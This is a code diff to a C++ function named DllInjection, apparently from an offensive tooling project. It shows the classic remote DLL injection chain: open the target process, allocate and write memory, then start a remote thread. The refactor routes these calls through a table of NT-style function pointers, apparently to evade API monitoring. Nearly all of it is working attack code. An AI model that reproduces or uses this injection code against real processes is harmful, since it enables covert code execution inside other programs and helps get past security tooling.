@@ -2,40 +2,53 @@
 
 namespace Technique::Injection
 {
-    BOOL DllInjection(DWORD dwPid, LPVOID lpDllPath, size_t dwDllPathSize)
-    {
+    BOOL DllInjection(
+        Procs::PPROCS   pProcs,
+        DWORD           dwPID,
+        LPVOID          lpDllPath,
+        DWORD           dwDllPathSize
+    ) {
         HANDLE hProcess;
         HANDLE hThread;
-        PVOID remoteBuffer;
-        BOOL bResults;
+        PVOID pBaseAddr;
 
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+        hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
         if (!hProcess)
         {
             return FALSE;
         }
-        
-        remoteBuffer = VirtualAllocEx(
+
+        pBaseAddr = System::Process::VirtualMemoryAllocate(
+            pProcs,
             hProcess,
-            NULL,
             dwDllPathSize,
-            MEM_COMMIT,
+            MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
-        if (!remoteBuffer)
+        if (!pBaseAddr)
         {
             return FALSE;
         }
 
-        bResults = WriteProcessMemory(
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
             hProcess,
-            remoteBuffer,
+            pBaseAddr,
             lpDllPath,
             dwDllPathSize,
             NULL
-        );
-        if (!bResults)
-        {
+        )) {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &pBaseAddr,
+                0,
+                MEM_RELEASE
+            );
             return FALSE;
         }
 
@@ -45,27 +58,39 @@ namespace Technique::Injection
         );
         if (!threadStartRoutineAddr)
         {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &pBaseAddr,
+                0,
+                MEM_RELEASE
+            );
             return FALSE;
         }
 
-        hThread = CreateRemoteThread(
+        hThread = System::Process::RemoteThreadCreate(
+            pProcs,
             hProcess,
-            NULL,
-            0,
             threadStartRoutineAddr,
-            remoteBuffer,
-            0,
-            NULL
+            pBaseAddr
         );
         if (!hThread)
         {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &pBaseAddr,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        WaitForSingleObject(hThread, INFINITE);
+        // pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
 
-        CloseHandle(hProcess);
-        CloseHandle(hThread);
+        // pProcs->lpNtClose(hProcess);
+        // pProcs->lpNtClose(hThread);
 
         return TRUE;
     }
